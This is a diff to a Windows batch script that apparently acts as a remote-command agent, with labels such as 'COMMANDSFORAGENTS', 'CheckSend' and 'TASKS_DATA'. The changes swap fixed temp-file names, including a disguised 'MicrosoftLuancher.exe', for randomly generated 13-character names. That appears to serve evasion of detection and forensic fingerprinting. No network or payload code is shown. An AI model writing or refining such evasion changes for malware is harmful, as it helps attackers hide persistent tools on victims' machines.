@@ -14,10 +14,17 @@ set "filename="
 
 
 
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename1=!filename!"
+
+
 
 
 :: Set the log file path
-set "LOGFILE=%temp%\9875426.exe"
+set "LOGFILE=%temp%\!filename1!"
 
 
 
@@ -75,8 +82,16 @@ set "lastMinute=none"
 
 
 
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename2=!filename!"
 
-set "InstalledQWB=%temp%\MicrosoftLuancher.exe"
+
+
+
+set "InstalledQWB=%temp%\!filename2!"
 del /f /q "%InstalledQWB%"
 
 
@@ -567,6 +582,11 @@ set "CheckSend=1"
 
 
 
+
+
+
+
+
 :COMMANDSFORAGENTS
 echo :COMMANDSFORAGENTS
 echo.
@@ -742,11 +762,15 @@ echo Operation completed.
 
 
 
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename3=!filename!"
 
 
 
-
-set "LAST_MIN_SENT_FILE=%temp%\lstminsnt.txt"
+set "LAST_MIN_SENT_FILE=%temp%\!filename3!"
 
 
 
@@ -900,15 +924,28 @@ echo.
 
 
 
+
+
 for /L %%i in (1,1,13) do (
     set /A "rand=!random! %% 62"
     for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
 )
+set "filename4=!filename!"
+set "TASKS_DATA=%temp%\!filename4!"
 
 
 
-set "TASKS_DATA=%temp%\tasks_data.txt"
-set "LOGFILE1=%temp%\!filename!"
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename5=!filename!"
+set "LOGFILE1=%temp%\!filename5!"
 
 
 
